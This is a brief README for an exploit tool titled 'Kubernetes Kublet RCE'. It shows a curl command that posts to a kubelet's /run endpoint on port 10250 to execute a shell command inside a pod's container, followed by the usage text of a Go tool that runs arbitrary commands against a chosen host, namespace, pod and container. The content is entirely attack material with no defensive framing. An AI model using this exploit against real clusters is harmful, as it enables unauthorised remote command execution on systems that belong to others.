# Kubernetes Kublet RCE

```bash
curl -k -XPOST https://`cat ip`:10250/run/default/nginx/nginx -d "cmd=ls -la /"

```


```bash
Usage of /tmp/go-build400256306/b001/exe/RCE:
  -C string
    	the container to use (default "nginx")
  -H string
    	The host to query (default "localhost")
  -c string
    	the command to run (default "ls")
  -n string
    	the namespace to use (default "default")
  -p int
    	the port to connect to (default 10250)
  -pod string
    	the pod to use (default "nginx")

```

